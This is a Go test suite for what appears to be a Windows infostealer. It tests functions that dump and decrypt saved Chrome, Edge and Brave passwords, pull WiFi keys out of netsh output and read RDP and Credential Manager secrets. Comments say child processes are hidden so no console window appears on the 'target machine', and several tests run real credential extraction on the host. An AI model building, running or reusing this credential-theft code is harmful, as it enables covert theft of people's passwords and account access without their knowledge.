//go:build windows && !light

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"os"
	"strings"
	"testing"
	"time"
	"unicode/utf16"
	"unicode/utf8"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── 测试说明 ──────────────────────────────────────────────────────────────────
//
// 这些单测**不需要**伪造浏览器数据文件：
//   - winsqlite3 读取用本机真实的 Login Data（只读 + 复制到 temp，读完删除）；
//   - v10 用测试自己生成的密钥/密文做 AES-GCM 往返（口令是伪造的）；
//   - v20 / 非法 UTF-8 / 无主密钥分支直接构造字节；
//   - 失败断言只打印长度/标注，不把真实口令写进测试日志。

// ─── exec_hidden ───────────────────────────────────────────────────────────────

func TestExecHiddenSetsHideWindow(t *testing.T) {
	cmd := execHidden(sysBin("netsh.exe"), "wlan", "show", "profiles")
	if cmd.SysProcAttr == nil {
		t.Fatal("execHidden 未设置 SysProcAttr：目标机上 netsh 会闪黑框")
	}
	if !cmd.SysProcAttr.HideWindow {
		t.Fatal("execHidden 必须设置 HideWindow=true（否则子进程会在目标机桌面弹控制台窗口）")
	}
	if cmd.SysProcAttr.CreationFlags&createNoWindowFlag == 0 {
		t.Fatalf("execHidden 必须带 CREATE_NO_WINDOW，CreationFlags=0x%x", cmd.SysProcAttr.CreationFlags)
	}
	if len(cmd.Args) != 4 || cmd.Args[1] != "wlan" || cmd.Args[3] != "profiles" {
		t.Fatalf("execHidden 参数没有原样传递: %v", cmd.Args)
	}
}

// ─── winsqlite3 ────────────────────────────────────────────────────────────────

func TestWinSQLiteMissingErrorMessage(t *testing.T) {
	const want = "系统缺少 winsqlite3.dll，无法解析浏览器登录数据"
	if got := errWinSQLiteUnavailable.Error(); got != want {
		t.Fatalf("winsqlite3 缺失时错误文案不对:\n got: %q\nwant: %q", got, want)
	}
}

func TestWinSQLiteLoads(t *testing.T) {
	db, err := getWinSQLite()
	if err != nil {
		t.Skipf("本机没有可用的 winsqlite3.dll（Win10/11 应自带）: %v", err)
	}
	if db == nil {
		t.Fatal("getWinSQLite 返回 nil 句柄但没有错误")
	}
}

// TestReadRealChromiumLoginData 用本机真实的 Login Data 验证"列边界正确"。
// 只读：复制到独立临时目录再打开，读完连目录一起删掉。
func TestReadRealChromiumLoginData(t *testing.T) {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		t.Skip("LOCALAPPDATA 为空，无法定位浏览器数据")
	}
	userDataDirs := []string{
		filepathJoin(localAppData, "Google", "Chrome", "User Data"),
		filepathJoin(localAppData, "Microsoft", "Edge", "User Data"),
		filepathJoin(localAppData, "BraveSoftware", "Brave-Browser", "User Data"),
	}

	profilesRead, totalRows, totalKept := 0, 0, 0
	for _, userData := range userDataDirs {
		profiles := chromiumProfiles(userData)
		if len(profiles) == 0 {
			continue
		}
		key := chromiumMasterKey(userData)
		for _, p := range profiles {
			dir, dbPath, err := copyLoginDataToTemp(p.loginDB)
			if err != nil {
				t.Fatalf("%s: 复制 Login Data 失败: %v", p.loginDB, err)
			}
			if _, statErr := os.Stat(dbPath); statErr != nil {
				os.RemoveAll(dir)
				t.Fatalf("%s: 临时副本不存在: %v", p.loginDB, statErr)
			}

			rows, err := readChromiumLoginRows(dbPath)
			os.RemoveAll(dir)
			if _, statErr := os.Stat(dir); statErr == nil {
				t.Fatalf("临时目录没有被删除: %s", dir)
			}
			if err != nil {
				t.Fatalf("%s: winsqlite3 读取失败: %v", p.loginDB, err)
			}
			profilesRead++

			for i, row := range rows {
				totalRows++
				// 列边界断言：origin_url 必须是 URL 或空，不能粘上 schema/字段名/下一条记录。
				if u := row.OriginURL; u != "" {
					if !strings.Contains(u, "://") {
						t.Fatalf("%s 第 %d 行 origin_url 不像 URL: %q", p.loginDB, i, u)
					}
					for _, marker := range []string{"logins_edge", "CREATE TABLE", "SQLite format", "\x00"} {
						if strings.Contains(u, marker) {
							t.Fatalf("%s 第 %d 行 origin_url 里混进了 %q: %q", p.loginDB, i, marker, u)
						}
					}
				}
				// password_value 是密文 BLOB：绝不能含 schema 文本（那是旧手写解析的错位证据）。
				for _, marker := range []string{"CREATE TABLE", "logins_edge", "SQLite format"} {
					if bytes.Contains(row.Password, []byte(marker)) {
						t.Fatalf("%s 第 %d 行 password_value 里出现了 schema 文本 %q（列边界错误）", p.loginDB, i, marker)
					}
				}
				if !utf8.ValidString(row.Username) {
					t.Fatalf("%s 第 %d 行 username_value 不是合法 UTF-8", p.loginDB, i)
				}
				// 顺手走一遍真实解密分派：v20 必须留空并标注。
				res := decryptChromiumPassword(row.Password, key)
				if row.Password != nil && bytes.HasPrefix(row.Password, []byte("v20")) {
					if res.password != "" || res.encrypted != "v20 (app-bound, 无法解密)" {
						t.Fatalf("%s 第 %d 行是 v20，必须标注且密码为空: %+v", p.loginDB, i, res)
					}
				}
				if res.password != "" {
					totalKept++
				}
			}
		}
	}
	if profilesRead == 0 {
		t.Skip("本机没有 Chrome/Edge/Brave 的 Login Data，跳过真读")
	}
	t.Logf("winsqlite3 真读 ok: profiles=%d rows=%d 解出非空口令=%d", profilesRead, totalRows, totalKept)
}

// TestDumpBrowserPasswordsNoGarbage 走完整收集路径（多 profile + 解密 + 过滤 + 去重），
// 断言结果里不可能出现"把 schema 名/字段名/密文当数据"的垃圾。
func TestDumpBrowserPasswordsNoGarbage(t *testing.T) {
	entries, err := dumpBrowserPasswords()
	if err != nil {
		t.Fatalf("dumpBrowserPasswords 失败: %v", err)
	}
	stats := browserStats.snapshot()
	t.Logf("browser: entries=%d stats=%v", len(entries), stats)

	badMarkers := []string{"tablelogins", "logins_edge", "CREATE TABLE", "SQLite format"}
	v20 := 0
	for i, e := range entries {
		u := e["url"]
		if u == "" || !strings.Contains(u, "://") {
			t.Fatalf("第 %d 条 url 不是 URL: %q", i, u)
		}
		for _, marker := range badMarkers {
			for _, field := range []string{"url", "username", "password"} {
				if strings.Contains(e[field], marker) {
					t.Fatalf("第 %d 条的 %s 里出现了 schema 文本 %q（列边界仍然错）", i, field, marker)
				}
			}
		}
		if strings.ContainsRune(e["url"], 0) || strings.ContainsRune(e["username"], 0) {
			t.Fatalf("第 %d 条 url/username 含 NUL", i)
		}
		if pw := e["password"]; pw != "" {
			if !utf8.ValidString(pw) {
				t.Fatalf("第 %d 条 password 不是合法 UTF-8", i)
			}
			for _, r := range pw {
				if (r < 0x20 && r != '\t') || r == 0x7f {
					t.Fatalf("第 %d 条 password 含控制字符（解码后未校验）", i)
				}
			}
		}
		if enc := e["encrypted"]; enc != "" {
			if e["password"] != "" {
				t.Fatalf("第 %d 条标了 %q 却仍有密码（失败分支不能输出字节）", i, enc)
			}
			if strings.HasPrefix(enc, "v20") {
				v20++
				if enc != "v20 (app-bound, 无法解密)" {
					t.Fatalf("第 %d 条 v20 标注不对: %q", i, enc)
				}
			}
		}
		if len(e["username"]) > 256 {
			t.Fatalf("第 %d 条 username 长度异常: %d", i, len(e["username"]))
		}
	}
	// 统计里的 undecryptable_v20 必须覆盖所有 v20 条目（可能还有被丢掉的空行）。
	if got := stats["undecryptable_v20"]; got < v20 {
		t.Fatalf("undecryptable_v20=%d 少于实际 v20 条目数 %d", got, v20)
	}
}

// ─── 密码解密分流 ──────────────────────────────────────────────────────────────

func sealTestV10(t *testing.T, key, plaintext []byte, prefix string) []byte {
	t.Helper()
	block, err := aes.NewCipher(key)
	if err != nil {
		t.Fatalf("aes.NewCipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		t.Fatalf("cipher.NewGCM: %v", err)
	}
	nonce := bytes.Repeat([]byte{0x11}, 12)
	sealed := gcm.Seal(nil, nonce, plaintext, nil)
	out := make([]byte, 0, len(prefix)+12+len(sealed))
	out = append(out, prefix...)
	out = append(out, nonce...)
	out = append(out, sealed...)
	return out
}

func TestDecryptChromiumPasswordV10RoundTrip(t *testing.T) {
	key := bytes.Repeat([]byte{0x42}, 32)
	// 伪造口令；真实口令不会进入测试。
	const fake = "test-pass-19666*"
	for _, prefix := range []string{"v10", "v11"} {
		raw := sealTestV10(t, key, []byte(fake), prefix)
		res := decryptChromiumPassword(raw, key)
		if res.password != fake || res.encrypted != "" || res.scheme != prefix || res.reason != "" {
			t.Fatalf("%s 解密结果不对: password=%q scheme=%q encrypted=%q reason=%q",
				prefix, res.password, res.scheme, res.encrypted, res.reason)
		}
	}
}

func TestDecryptChromiumPasswordV20IsMarked(t *testing.T) {
	raw := append([]byte("v20"), bytes.Repeat([]byte{0xAB}, 40)...)
	res := decryptChromiumPassword(raw, bytes.Repeat([]byte{0x42}, 32))
	if res.password != "" {
		t.Fatalf("v20 绝不能输出任何密码，得到 %q", res.password)
	}
	if res.encrypted != "v20 (app-bound, 无法解密)" {
		t.Fatalf("v20 标注不对: %q", res.encrypted)
	}
	if res.reason != "v20" || res.scheme != "v20" {
		t.Fatalf("v20 分支不对: %+v", res)
	}
}

func TestDecryptChromiumPasswordInvalidUTF8(t *testing.T) {
	key := bytes.Repeat([]byte{0x24}, 32)
	raw := sealTestV10(t, key, []byte{0xff, 0xfe, 0x80, 0xc3}, "v10")
	res := decryptChromiumPassword(raw, key)
	if res.password != "" {
		t.Fatalf("非法 UTF-8 必须丢弃，得到 %q", res.password)
	}
	if res.encrypted != "decrypt-failed" || res.reason != "bad-utf8" {
		t.Fatalf("非法 UTF-8 标注不对: %+v", res)
	}
	browserStats.reset()
	recordChromiumFailure(res)
	if browserStats.snapshot()["bad_utf8"] != 1 {
		t.Fatal("非法 UTF-8 没有计数（bad_utf8）")
	}
}

func TestDecryptChromiumPasswordNoMasterKey(t *testing.T) {
	raw := sealTestV10(t, bytes.Repeat([]byte{0x01}, 32), []byte("whatever"), "v11")
	res := decryptChromiumPassword(raw, nil)
	if res.password != "" || res.encrypted != "decrypt-failed" || res.reason != "no-key" {
		t.Fatalf("无主密钥分支不对: %+v", res)
	}
}

func TestDecryptChromiumPasswordLegacyDPAPIRejectsGarbage(t *testing.T) {
	res := decryptChromiumPassword([]byte{1, 2, 3, 4, 5, 6, 7, 8}, nil)
	if res.password != "" {
		t.Fatalf("DPAPI 解密失败时不能输出任何字节，得到 %q", res.password)
	}
	if res.encrypted != "decrypt-failed" {
		t.Fatalf("DPAPI 失败标注不对: %q", res.encrypted)
	}
}

func TestValidateChromiumPlaintext(t *testing.T) {
	if s, ok := validateChromiumPlaintext([]byte("p@ss中文")); !ok || s != "p@ss中文" {
		t.Fatalf("合法 UTF-8 被丢弃: %q ok=%v", s, ok)
	}
	if s, ok := validateChromiumPlaintext([]byte("abc\x00\x00")); !ok || s != "abc" {
		t.Fatalf("尾部 NUL 未清理: %q ok=%v", s, ok)
	}
	if s, ok := validateChromiumPlaintext(testUTF16LE("密码123")); !ok || s != "密码123" {
		t.Fatalf("UTF-16LE 口令未解码: %q ok=%v", s, ok)
	}
	if s, ok := validateChromiumPlaintext([]byte{0xff, 0xfe, 0x80}); ok {
		t.Fatalf("非法 UTF-8 被判为合法: %q", s)
	}
	if s, ok := validateChromiumPlaintext([]byte("a\x01b")); ok {
		t.Fatalf("控制字符被判为合法: %q", s)
	}
}

func TestDecodeCredentialBlobUTF16(t *testing.T) {
	blob := append(testUTF16LE("RdpPass!"), 0, 0)
	if got := decodeCredentialBlob(blob); got != "RdpPass!" {
		t.Fatalf("凭据 blob UTF-16LE 解码失败: %q", got)
	}
	if got := decodeCredentialBlob([]byte{0x00, 0x01, 0x02, 0x03}); got != "" {
		t.Fatalf("二进制 blob 不能当口令输出: %q", got)
	}
}

// ─── WiFi（黑框 + GBK 乱码） ───────────────────────────────────────────────────

func TestParseWlanProfilesEnglish(t *testing.T) {
	out := "Profiles on interface Wi-Fi:\r\n\r\n" +
		"Group policy profiles (read only)\r\n" +
		"---------------------------------\r\n" +
		"    All User Profile     : CorpNet\r\n" +
		"    All User Profile     : Cafe Wi Fi\r\n" +
		"\r\n" +
		"User profiles\r\n" +
		"-------------\r\n" +
		"    All User Profile     : Home\r\n"
	got := parseWlanProfileNames(out)
	want := []string{"CorpNet", "Cafe Wi Fi", "Home"}
	if len(got) != len(want) {
		t.Fatalf("英文输出 SSID 解析不对: %#v", got)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("英文输出 SSID 第 %d 个不对: got %q want %q", i, got[i], want[i])
		}
	}
}

func TestParseWlanProfilesChineseGBK(t *testing.T) {
	// 中文系统上 netsh 输出是 GBK 字节：构造真机同款输出，走 decodeConsoleText
	// 再解析，证明"乱码导致 SSID 匹配不到"的问题真的修掉了。
	raw := "接口 WLAN 上的配置文件:\r\n\r\n" +
		"组策略配置文件(只读)\r\n" +
		"---------------------------------\r\n" +
		"    所有用户配置文件 : 办公室WiFi\r\n" +
		"    用户配置文件     : 个人热点\r\n"
	extracted := decodeConsoleText(string(utf8ToGBK([]byte(raw))))
	got := parseWlanProfileNames(extracted)
	if len(got) != 1 || got[0] != "办公室WiFi" {
		t.Fatalf("GBK 输出的 SSID 解析失败: %#v（解码后=%q）", got, extracted)
	}
	if strings.Contains(extracted, "锟") || !utf8.ValidString(extracted) {
		t.Fatalf("decodeConsoleText 没有把 GBK 解成合法 UTF-8: %q", extracted)
	}
}

func TestParseWlanKeyContent(t *testing.T) {
	chinese := "    安全密钥            : 不存在\r\n    关键内容            : Pa$$w0rd\r\n"
	if got := parseWlanKeyContent(decodeConsoleText(string(utf8ToGBK([]byte(chinese))))); got != "Pa$$w0rd" {
		t.Fatalf("中文 key=clear 输出解析失败: %q", got)
	}
	if got := parseWlanKeyContent("    Key Content         : hello world\r\n"); got != "hello world" {
		t.Fatalf("英文 Key Content 解析失败: %q", got)
	}
	// 开放网络（没有关键内容）→ 空串，调用方会跳过该 profile，不产出空条目。
	if got := parseWlanKeyContent("    安全密钥            : 不存在\r\n"); got != "" {
		t.Fatalf("没有关键内容时应返回空串，得到 %q", got)
	}
}

// ─── RDP：耗时测量 + 结构 ─────────────────────────────────────────────────────

// TestDumpRDPCredentialsTimings 真机测量：枚举 vs 逐条后处理各花多少毫秒。
func TestDumpRDPCredentialsTimings(t *testing.T) {
	entries, err := dumpRDPCredentials()
	if err != nil {
		t.Fatalf("dumpRDPCredentials 失败: %v", err)
	}
	tm := rdpTimingStats.snapshot()
	t.Logf("rdp: items=%d entries=%d cred_enumerate_ms=%d item_process_ms=%d cred_read_sum_ms=%d total_ms=%d",
		tm["items"], len(entries), tm["cred_enumerate_ms"], tm["item_process_ms"],
		tm["cred_read_sum_ms"], tm["total_ms"])
	if _, ok := tm["cred_enumerate_ms"]; !ok {
		t.Fatal("没有记录 cred_enumerate_ms：RDP 耗时没有被测量")
	}
	if tm["total_ms"] < tm["cred_enumerate_ms"] {
		t.Fatalf("total_ms(%d) 不能小于枚举耗时(%d)", tm["total_ms"], tm["cred_enumerate_ms"])
	}
	for i, e := range entries {
		if e["target_name"] == "" {
			t.Fatalf("第 %d 条没有 target_name", i)
		}
		if strings.ContainsRune(e["password"], 0) {
			t.Fatalf("第 %d 条口令里含 NUL（UTF-16 没解码）", i)
		}
		if !utf8.ValidString(e["password"]) || !utf8.ValidString(e["username"]) {
			t.Fatalf("第 %d 条不是合法 UTF-8", i)
		}
	}
}

// TestCredEnumerateFilterCost 只测"枚举成本"，用来决定是否收窄 Filter。
// 只统计条数与耗时，不读取任何口令。
func TestCredEnumerateFilterCost(t *testing.T) {
	if err := procCredEnumerateW.Find(); err != nil {
		t.Skipf("CredEnumerateW 不可用: %v", err)
	}
	for _, filter := range []string{"", "TERMSRV/*", "Domain:*"} {
		var filterPtr *uint16
		if filter != "" {
			p, err := windows.UTF16PtrFromString(filter)
			if err != nil {
				t.Fatalf("UTF16PtrFromString(%q): %v", filter, err)
			}
			filterPtr = p
		}
		var (
			total time.Duration
			creds int
			runs  int
		)
		for i := 0; i < 20; i++ {
			var count uint32
			var ptr uintptr
			started := time.Now()
			ret, _, callErr := procCredEnumerateW.Call(
				uintptr(unsafe.Pointer(filterPtr)),
				0,
				uintptr(unsafe.Pointer(&count)),
				uintptr(unsafe.Pointer(&ptr)),
			)
			elapsed := time.Since(started)
			if ret == 0 {
				if callErr == windows.ERROR_NOT_FOUND {
					creds = 0
					break
				}
				t.Fatalf("filter %q 枚举失败: %v", filter, callErr)
			}
			if ptr != 0 {
				procCredFree.Call(ptr)
			}
			creds = int(count)
			total += elapsed
			runs++
		}
		if runs > 0 {
			t.Logf("CredEnumerateW filter=%-12q creds=%d avg=%v", filter, creds, total/time.Duration(runs))
		}
	}
}

// ─── 小工具 ───────────────────────────────────────────────────────────────────

func testUTF16LE(s string) []byte {
	u := utf16.Encode([]rune(s))
	b := make([]byte, 0, len(u)*2)
	for _, c := range u {
		b = append(b, byte(c), byte(c>>8))
	}
	return b
}

func filepathJoin(elem ...string) string {
	return strings.Join(elem, string(os.PathSeparator))
}
